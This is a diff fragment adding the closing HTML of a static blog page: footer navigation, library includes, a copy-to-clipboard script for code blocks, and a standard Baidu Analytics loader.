+    
+    2020-2021
+    R17a
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/download/">Download</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?05441306932d71b1dba39f817847ce3e";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
